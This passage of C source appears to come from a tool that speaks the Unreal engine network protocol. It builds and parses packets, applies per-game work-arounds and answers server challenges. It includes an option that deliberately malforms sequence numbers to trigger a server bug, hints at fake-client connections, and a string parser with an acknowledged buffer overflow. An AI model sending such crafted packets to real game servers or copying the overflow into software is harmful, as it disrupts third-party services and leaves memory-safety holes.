        } else if(!strcmp(errmsg, "NOFASTCONNECT")) {
            fast_connect = 0;
        } else if(!strcmp(errmsg, "NOFIX")) {
            activate_fix(NULL);
        } else if(!strcmp(errmsg, "AAFIX")) {
            activate_fix(&aafix);
        } else if(!strcmp(errmsg, "AA3FIX")) {
            activate_fix(&aa3fix);
        } else if(!strcmp(errmsg, "U3FIX")) {
            activate_fix(&u3fix);
        } else if(!strcmp(errmsg, "UNREAL1FIX")) {
            activate_fix(&unreal1fix);
        } else if(!strcmp(errmsg, "PARIAHFIX")) {
            activate_fix(&pariahfix);
        } else if(!strcmp(errmsg, "MOVFIX")) {
            activate_fix(&movfix);
        } else if(!strcmp(errmsg, "RVFIX")) {
            activate_fix(&rvfix);
        } else if(!strcmp(errmsg, "VEGASFIX")) {
            activate_fix(&vegasfix);
        } else if(!strcmp(errmsg, "DEVAFIX")) {
            activate_fix(&devafix);
        } else if(!strcmp(errmsg, "BIAFIX")) {
            activate_fix(&biafix);
        } else {
            printf("\nError: \"%s\"\n", errmsg);
            exit(1);
        }
    }
    return(0);
}



int lame_random_gen(u8 *data, int size) {
    static u32  rnd = 0;
    int     i;

    if(!rnd) rnd = time(NULL);

    size = rnd % size;
    if(size < 3) size = 3;

    for(i = 0; i < size; i++) {
        rnd = ((rnd * 0x343FD) + 0x269EC3) >> 1;
        //rnd += time(NULL);  // blah lame
        data[i] = rnd;
    }
    return(size);
}



void hex2guid(u8 *in, u8 *out) {
    int     i;

    for(i = 0; i < 16; i++) {
        if((in[0] <= ' ') || (in[1] <= ' ')) {
            printf("\nError: invalid GUID (smaller than 32 chars)\n");
            exit(1);
        }
        out[(i & ~3) + (3 - (i & 3))] = hex2byte(in);   // in the file channel there is a different order of the guid (big endian?)
        in += 2;
    }
}



u8 *hex2str(u8 *in, int *outsz) {
    int     len,
            t,
            n,
            i;
    u8      *out,
            *limit;

    len = strlen(in);
    //out = malloc(len / 2);
    out = malloc(BUFFSZ+1); // due to the '*' cool char

    limit = in + len;
    for(i = 0; in < limit; in++) {
        if((in[0] <= ' ') || (in[1] <= ' ')) continue;
        if(*in == '*') {    // cool
            in++;
            if(sscanf(in, "%d%n", &t, &n) == 1) {
                in += n;
                if(t > 0) { // yeah bof but this is user's stuff
                    memset(out + i, (!i) ? 0x00 : out[i-1], t);
                    i += t;
                }
            }
            continue;
        }
        out[i] = hex2byte(in);
        i++;
        in++;
    }
    if(i > BUFFSZ) {
        printf("\nError: too much data in the -s/S option (check the number after '*')\n");
        exit(1);
    }
    *outsz = i;
    return(out);
}



u8 hex2byte(u8 *hex) {
    static const u8 hextable[256] =
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x00\x00\x00\x00\x00\x00"
        "\x00\x0a\x0b\x0c\x0d\x0e\x0f\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x00\x0a\x0b\x0c\x0d\x0e\x0f\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";

    return((hextable[hex[0]] << 4) | hextable[hex[1]]);
}



quick_thread(client, int sd) {
    int     len;
    u8      *buff;

    buff = malloc(0xffff);
    if(!buff) std_err();

    for(;;) {   // show any other incoming message
        len = recvfrom(sd, buff, 0xffff, 0, NULL, NULL);
        //if(len < 0) std_err();
        if(len < 0) break;
        unreal_parse_pck(buff, len, NULL, NULL);
    }
    free(buff);
    //printf("\n- done\n");
    //exit(1);
    return(0);
}



void activate_fix(int *fix) {
    u8      *str    = NULL;

    aafix       = 0;
    aa3fix      = 0;
    u3fix       = 0;
    rvfix       = 0;
    pariahfix   = 0;
    movfix      = 0;
    unreal1fix  = 0;
    vegasfix    = 0;
    devafix     = 0;
    biafix      = 0;
    if(fix) {
        *fix = 1;
        if(fix == &aafix)           str = "America's Army";
        else if(fix == &aa3fix)     str = "America's Army 3";
        else if(fix == &u3fix)      str = "Unreal 3 engine";
        else if(fix == &unreal1fix) str = "Unreal1";
        else if(fix == &pariahfix)  str = "Pariah/Warpath";
        else if(fix == &movfix)     str = "Men of Valor/SWRC";
        else if(fix == &rvfix)      str = "Raven Shield";
        else if(fix == &vegasfix)   str = "Rainbow Six Vegas 2";
        else if(fix == &devafix)    str = "Devastation";
        else if(fix == &biafix)     str = "Brothers in Arms";
    } else {
        str = "no need of";
    }
    printf("\n- %s protocol work-arounds%s", str, fast_connect ? " (fast)" : "");
}



int unreal_send_recv(int sd, u8 *in, int insz, u8 *out, int outsz, struct sockaddr_in *peer, int *chall, u8 **errmsg) {
    int     len;
    u8      ret_buff[BUFFSZ+1];

    if(send_hexdump && in) {
        printf("\n- outgoing packet:\n");
        show_dump(in, insz, stdout);
    }

    len = send_recv(sd, in, insz, out, outsz, peer, first_time);
    if(len < 0) {
        if(len == -1) std_err();
        printf(" players_per_IP limit or timed out ");
        sleep(ONESEC);
        *errmsg = NULL;
        return(-1);
    }
    if(first_time) first_time = 0;
    if(!out) return(0);

#ifdef DUMPPCK
    static  int num = 0;
    FILE    *fd;
    char    fname[64];
    sprintf(fname, "unrealfp_pck.%03d", num++);
    fd = fopen(fname, "wb");
    if(!fd) std_err();
    fwrite(out, 1, len, fd);
    fclose(fd);
#endif

    if(!errmsg) return(len);
    *errmsg = unreal_parse_pck(out, len, chall, ret_buff);
    strcpy(out, ret_buff);
    if(*errmsg) return(-1);
    return(len);
}



u8 *rndhash(int size) {
    static u32  rnd = 0;
    static int  sel = 0;
    static u8   out[4][256];
    static const u8 hex[] = "0123456789abcdef";
    int         i;
    u8          *ret,
                *p;

    if(!rnd) rnd = ~time(NULL);

    ret = out[sel++ & 3];
    p = ret;
    for(i = 0; i < size; i++) {
        rnd = ((rnd * 0x343FD) + 0x269EC3) >> 1;
        *p++ = hex[(rnd & 0xff) >> 4];
        *p++ = hex[(rnd & 0xff) & 15];
    }
    *p = 0;
    return(ret);
}



int unreal_info(struct sockaddr_in *peer) {
    u32     chall;
    int     sd,
            len,
            oldtype     = 0,
            retver      = 0;
    u8      buff[4096],
            gs3[sizeof(GS3_QUERYX) - 1],
            *gamever    = NULL,
            *hostport   = NULL;

    sd = udp_sock(0);

    printf("\n- send info queries\n");
          send_recv(sd, GS1_QUERY, sizeof(GS1_QUERY) - 1, NULL, 0, peer, 0);
          send_recv(sd, GS2_QUERY, sizeof(GS2_QUERY) - 1, NULL, 0, peer, 0);
          send_recv(sd, GS3_QUERY, sizeof(GS3_QUERY) - 1, NULL, 0, peer, 0);
    len = send_recv(sd, NULL, 0, buff, sizeof(buff), peer, 0);
    if(len < 0) goto quit;
    if(buff[0] == '\\') {
        oldtype = 1;
    } else if(buff[0] == 9) {
        memcpy(gs3, GS3_QUERYX, sizeof(GS3_QUERYX) - 1);
        chall = atoi(buff + 5);
        gs3[7]  = chall >> 24;
        gs3[8]  = chall >> 16;
        gs3[9]  = chall >>  8;
        gs3[10] = chall;
        len = send_recv(sd, gs3, sizeof(GS3_QUERYX) - 1, buff, sizeof(buff), peer, 0);
        if(len < 0) goto quit;
    }

    printf("\n- handle reply:\n");
    gs_handle_info(buff, len,
        oldtype ? 1 : 0, oldtype ? '\\' : '\0', oldtype ? 0 : 5, 0,
        "gamever",  &gamever,
        "hostport", &hostport,
        NULL,       NULL);

    if(gamever) {
        retver = atoi(gamever);
    }
    if(hostport && atoi(hostport)) {
        peer->sin_port = htons(atoi(hostport));
        printf("\n- set hostport %hu\n", ntohs(peer->sin_port));
    }

quit:
    close(sd);
    return(retver);
}



int gs_handle_info(u8 *data, int datalen, int nt, int chr, int front, int rear, ...) {
    va_list ap;
    int     i,
            args,
            found;
    u8      **parz,
            ***valz,
            *p,
            *limit,
            *par,
            *val;

    va_start(ap, rear);
    for(i = 0; ; i++) {
        if(!va_arg(ap, u8 *))  break;
        if(!va_arg(ap, u8 **)) break;
    }
    va_end(ap);

    args = i;
    parz = malloc(args * sizeof(u8 *));
    valz = malloc(args * sizeof(u8 **));

    va_start(ap, rear);
    for(i = 0; i < args; i++) {
        parz[i]  = va_arg(ap, u8 *);
        valz[i]  = va_arg(ap, u8 **);
        *valz[i] = NULL;
    }
    va_end(ap);

    found  = 0;
    limit  = data + datalen - rear;
    *limit = 0;
    data   += front;
    par    = NULL;
    val    = NULL;

    for(p = data; (data < limit) && p; data = p + 1, nt++) {
        p = strchr(data, chr);
        if(p) *p = 0;

        if(nt & 1) {
            if(!par) continue;
            val = data;
            printf("  %30s %s\n", par, val);

            for(i = 0; i < args; i++) {
                if(!stricmp(par, parz[i])) *valz[i] = val;
            }
        } else {
            par = data;
        }
    }

    free(parz);
    free(valz);
    return(found);
}



int fgetz(u8 *data, int len, FILE *fd) {
    u8      *p;

    if(!fgets(data, len, fd)) return(-1);
    for(p = data; *p && (*p != '\n') && (*p != '\r'); p++);
    *p = 0;
    return(p - data);
}



int calc_authresp(int num) {
    if(challenge_fix == 1) return((num * 178) ^ (num >> 16) ^ (num << 16) ^ 0xfe11ae23);    // FFOW
    return((num * 237) ^ (num >> 16) ^ (num << 16) ^ 0x93fe92ce);
}



int write_unrnum(int num, u8 *buff, int bits) {
    int     len;
    u8      mini[5];

    len = write_unreal_index(num, mini);
    return(write_bitmem(mini, len, buff, bits));
}



int read_unrnum(int *num, u8 *buff, int bits) {
    u8      mini[5];

    *num = 0;
    read_bitmem(buff, 5, mini, bits);
    return(bits + (read_unreal_index(mini, num) << 3));
}



int write_unrser(int num, u8 *buff, int bits, int max) {    // forcompability with core.dll
    int     b;

    for(b = 1; b && (b < max); b <<= 1) {
        bits = write_bits((num & b) ? 1 : 0, 1, buff, bits);
    }
    return(bits);
}



int read_unrser(int *num, u8 *buff, int bits, int max) {    // forcompability with core.dll
    int     b;

    *num = 0;
    for(b = 1; b && (b < max); b <<= 1) {
        if(read_bitx(1, buff, &bits)) *num += b;
    }
    return(bits);
}



u8 *unreal_parse_pck(u8 *buff, int size, int *chall, u8 *ret_buff) {
    bunch_t bunch;
    int     b,
            btmp,
            blen,
            bsize,
            len,
            val4000,
            val400,
            val3ff,
            val8,
            val1000,
            ret_buffn   = 0;
    u8      *p;
    static int  retfix  = 0,
                done    = 0;
    static u8   str[BUFFSZ+1];

    if(size <= 0) return(NULL);
    if(force_fix) retfix = force_fix;
    if(chall) *chall = 0;
    if(ret_buff) ret_buff[0] = 0;

    val4000 = 0x4000;
    val3ff  = 0x3ff;
    val400  = 0x400;
    val8    = 0x8;
    val1000 = 0x1000;
    if(unreal1fix) val4000 = 0x10000;
    if(unreal1fix) val400 = 0x10000;
    if(pariahfix) val8 = 0x4;
    if(aafix) val3ff = 0x800;
    if(aa3fix) val3ff = 0x5dc;
    if(rvfix) val3ff = 0x50f;   // takes the same number of bits of AA... it's useless
    if(movfix) val1000 = 0x1e00;
    if(biafix) {
        val3ff  = 0x7ff;
        val1000 = 0x1e00;
    }

    b = buff[size - 1];
    if(!b) return(NULL);
    for(bsize = (size * 8) - 1; !(b & 0x80); b <<= 1, bsize--);

    b = 0;
    if(vegasfix) {
        if(size < 4) return(NULL);
        if(memcmp(buff, "\xff""AGO", 4)) return(NULL);
        b += 4 * 8;
    }
    b = read_unrser(&bunch.PacketId, buff, b, val4000);
    while(b < bsize) {
        if(devafix) read_bitx(1, buff, &b);
        if(read_bitx(1, buff, &b)) {
            b = read_unrser(&bunch.AckPacketId, buff, b, val4000);
            continue;
        }
        if(read_bitx(1, buff, &b)) {
            bunch.bOpen  = read_bitx(1, buff, &b);
            bunch.bClose = read_bitx(1, buff, &b);
        } else {
            bunch.bOpen  = 0;
            bunch.bClose = 0;
        }
        bunch.bReliable = read_bitx(1, buff, &b);
        b = read_unrser(&bunch.ChIndex, buff, b, val3ff);
        if(bunch.bReliable) b = read_unrser(&bunch.ChSequence, buff, b, val400);
        if(bunch.bReliable || bunch.bOpen) {
            b = read_unrser(&bunch.ChType, buff, b, val8);
        } else {
            bunch.ChType = 0;
        }

        b = read_unrser(&blen, buff, b, val1000);
        if((b + blen) > bsize) break;

        if(bunch.ChType != CHTYPE_Control) {
            b += blen;
            continue;
        }

        for(btmp = b + blen; b < btmp;) {
            b = read_unrnum(&len, buff, b);
            if((len < 0) || (len > (sizeof(str) - 1))) break; 
            b = read_bitmem(buff, len, str, b);
            str[len] = 0;
            if(verbose) printf("\n  %s\n", str);
            if(!done) done++;       // compatibility fixes ok
            if(ret_buff) {
                ret_buffn += sprintf(ret_buff + ret_buffn, "%.*s\n", BUFFSZ - ret_buffn, str);
            }
            if(chall) {
                p = strstr(str, "CHALLENGE=");
                if(p) {
                    sscanf(p + 10, hex_challenge ? "%08X" : "%i", chall);
                    *chall = calc_authresp(*chall);
                }
            }
            if(strstr(str, "FAIL") || strstr(str, "BRAWL") || strstr(str, "UPGRADE")) {
                return(str);
            }
            if(done == 1) done++;   // player accepted
        }
        b = btmp;
    }

    if(!done) {
        if(!force_fix) {
            if(force_fast) return(NULL);
            if(force_full) {
                retfix++;
            } else if(!fast_connect) {
                if(!retfix) fast_connect = 1;
                retfix++;
            } else {
                fast_connect = 0;   // it' useless for the other games
            }
        }
        if(retfix == 0)  return("NOFIX");
        if(retfix == 1)  return("AAFIX");
        if(retfix == 2)  return("U3FIX");
        if(retfix == 3)  return("UNREAL1FIX");
        if(retfix == 4)  return("PARIAHFIX");
        if(retfix == 5)  return("MOVFIX");
        if(retfix == 6)  return("RVFIX");
        if(retfix == 7)  return("AA3FIX");
        if(retfix == 8)  return("VEGASFIX");
        if(retfix == 9)  return("DEVAFIX");
        if(retfix == 10) return("BIAFIX");
        goto error;
    }
    if(done == 1) {
        if(fast_connect) return("NOFASTCONNECT");
        goto error;
    }
    return(NULL);
error:
    printf("\n"
        "Error: seems that this game requires a specific compatibility fix or gamestate\n"
        "       try to relaunch this tool another time\n"
        "       if still fails use the options -v -V for debugging\n"
        "\n");
    exit(1);
    return(NULL);
}



int unreal_build_pck(u8 *buff, int pck, int channel, ...) {
    static int  chanseq[256] = {0};
    static int  lame_channel = 0;   // really lame
    bunch_t bunch;
    va_list ap;
    int     b,
            sl,
            len,
            bpos,
            bsize,
            val4000,
            val400,
            val3ff,
            val8,
            val1000;
    u8      *s;

    val4000 = 0x4000;
    val3ff  = 0x3ff;
    val400  = 0x400;
    val8    = 0x8;
    val1000 = 0x1000;
    if(unreal1fix) val4000 = 0x10000;
    if(unreal1fix) val400 = 0x10000;
    if(pariahfix) val8 = 0x4;
    if(aafix) val3ff = 0x800;
    if(aa3fix) val3ff = 0x5dc;
    if(rvfix) val3ff = 0x50f;   // takes the same number of bits of AA... it's useless
    if(movfix) val1000 = 0x1e00;
    if(biafix) {
        val3ff  = 0x7ff;
        val1000 = 0x1e00;
    }

    if(channel < 0) {
        channel = lame_channel++;
        if(channel == CHTYPE_Control) channel = lame_channel++;
    }
    if(!pck) memset(&chanseq, 0, sizeof(chanseq));
    bunch.AckPacketId   = 0;
    bunch.ChIndex       = channel - 1;  // the -d all bug needs it and in any case it's necessary to have an index for each channel (like an array)
    bunch.ChType        = channel;
    bunch.ChSequence    = ++chanseq[channel & 0xff];    // stay within chanseq
    bunch.PacketId      = pck;
    bunch.bOpen         = 0;
    bunch.bClose        = 0;
    bunch.bReliable     = 1;
    if(bunch.ChSequence == 1) bunch.bOpen = 1;
    if((bug == 1) && enable_bug) bunch.ChSequence++;

    b = 0;
    if(vegasfix) {
        memcpy(buff, "\xff""AGO", 4);
        b += 4 * 8;
        bunch.PacketId = 0x3fff;    // ???
    }
    b = write_unrser(bunch.PacketId, buff, b, val4000);
    do {
        if(devafix) b = write_bits(0, 1, buff, b);
        b = write_bits(0, 1, buff, b);  // not an Ack
        if(bunch.bOpen || bunch.bClose) {
            b = write_bits(1, 1, buff, b);
            b = write_bits(bunch.bOpen,  1, buff, b);
            b = write_bits(bunch.bClose, 1, buff, b);
        } else {
            b = write_bits(0, 1, buff, b);
        }
        b = write_bits(bunch.bReliable, 1, buff, b);
        b = write_unrser(bunch.ChIndex, buff, b, val3ff);
        if(bunch.bReliable) b = write_unrser(bunch.ChSequence, buff, b, val400);
        if(bunch.bReliable || bunch.bOpen) b = write_unrser(bunch.ChType, buff, b, val8);

        bpos = b;
        b = write_unrser(0, buff, b, val1000);  // reserve space for the size
        bsize = b;
        va_start(ap, channel);
        while((s = va_arg(ap, u8 *))) {
            if(bunch.ChType == CHTYPE_Control) {
                sl = strlen(s) + 1;
                if(sl == 1) continue;   // skip if "", for example cmd_plus is set to ""
                if(send_verbose) printf("\n^ %s", s);
                b = write_unrnum(sl, buff, b);
                b = write_bitmem(s, sl, buff, b);
            } else {
                sl = va_arg(ap, int);
                b = write_bitmem(s, sl, buff, b);
                s = va_arg(ap, u8 *);   // check if the next exists
                break;
            }
        }
        va_end(ap);
        write_unrser(b - bsize, buff, bpos, val1000);
    } while(s);

    // old solution
    //write_bits(0, 8, buff, b);  // zero pad
    //len = b >> 3;
    //if(!(buff[len] & 0x80)) buff[len] |= (1 << (b & 7));
    //len++;
    sl = 0x80;
    len = (b + 7) & (~7);
    if(len != b) sl = 1 << ((len - b) - 1);
    len >>= 3;
    buff[len] = sl;
    len++;

    if(send_verbose) printf("\n");

    if(len > BUFFSZ) {  // in reality it's 0xffff but the engine uses 576
        printf("\nError: your packet is too big\n");
        exit(1);
    }
    return(len);
}



int read_unreal_index(u8 *index_num, int *ret) {
    int     len,
            result;
    u8      b0 = index_num[0],
            b1 = index_num[1],
            b2 = index_num[2],
            b3 = index_num[3],
            b4 = index_num[4];

    if(u3fix || aa3fix || vegasfix || biafix) {
        *ret = b0 | (b1 << 8) | (b2 << 16) | (b3 << 24);
        return(4);
    }

    result = 0;
    len    = 1;
    if(b0 & 0x40) {
        len++;
        if(b1 & 0x80) {
            len++;
            if(b2 & 0x80) {
                len++;
                if(b3 & 0x80) {
                    len++;
                    result = b4;
                }
                result = (result << 7) | (b3 & 0x7f);
            }
            result = (result << 7) | (b2 & 0x7f);
        }
        result = (result << 7) | (b1 & 0x7f);
    }
    result = (result << 6) | (b0 & 0x3f);
    if(b0 & 0x80) result = -result;
    *ret = result;
    return(len);
}



int write_unreal_index(int number, u8 *index_num) {
    int     len,
            sign = 1;

    if(u3fix || aa3fix || vegasfix || biafix) {
        index_num[0] = number & 0xff;
        index_num[1] = (number >> 8) & 0xff;
        index_num[2] = (number >> 16) & 0xff;
        index_num[3] = (number >> 24) & 0xff;
        return(4);
    }

    if(number < 0) {
        number = -number;
        sign = -1;
    }

    len = 1;
    index_num[0] = (number & 0x3f);
    if(number >>= 6) {
        index_num[0] += 0x40;
        index_num[1] = (number & 0x7f);
        len++;
        if(number >>= 7) {
            index_num[1] += 0x80;
            index_num[2] = (number & 0x7f);
            len++;
            if(number >>= 7) {
                index_num[2] += 0x80;
                index_num[3] = (number & 0x7f);
                len++;
                if(number >>= 7) {
                    index_num[3] += 0x80;
                    index_num[4] = number;
                    len++;
                }
            }
        }
    }
    if(sign < 0) index_num[0] += 0x80;
    return(len);
}



u32 read_bitx(u32 bits, u8 *in, u32 *in_bits) {
    u32     ret;

    ret = read_bits(bits, in, *in_bits);
    *in_bits += bits;
    return(ret);
}



int read_bitmem(u8 *in, int inlen, u8 *out, int bits) {
    for(; inlen--; out++) {
        *out = read_bitx(8, in, &bits);
    }
    return(bits);
}



int write_bitmem(u8 *in, int inlen, u8 *out, int bits) {
    for(; inlen--; in++) {
        bits = write_bits(*in, 8, out, bits);
    }
    return(bits);
}



int send_recv(int sd, u8 *in, int insz, u8 *out, int outsz, struct sockaddr_in *peer, int err) {
    int     retry = 2,
            len;

    if(in) {
        while(retry--) {
            if(!quiet) fputc('.', stdout);
            if(sendto(sd, in, insz, 0, (struct sockaddr *)peer, sizeof(struct sockaddr_in))
              < 0) goto quit;
            if(!out) return(0);
            if(!timeout(sd, 2)) break;
        }
    } else {
        if(timeout(sd, 3) < 0) retry = -1;
    }

    if(retry < 0) {
        if(!err) return(-2);
        printf("\nError: socket timeout, no reply received\n\n");
        exit(1);
    }

    if(!quiet) fputc('.', stdout);
    len = recvfrom(sd, out, outsz, 0, NULL, NULL);
    if(len < 0) goto quit;
    return(len);
quit:
    if(err) std_err();
    return(-1);
}



int timeout(int sock, int secs) {
    struct  timeval tout;
    fd_set  fd_read;

    tout.tv_sec  = secs;
    tout.tv_usec = 0;
    FD_ZERO(&fd_read);
    FD_SET(sock, &fd_read);
    if(select(sock + 1, &fd_read, NULL, NULL, &tout)
      <= 0) return(-1);
    return(0);
}



u32 resolv(char *host) {
    struct  hostent *hp;
    u32     host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u32 *)hp->h_addr;
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif


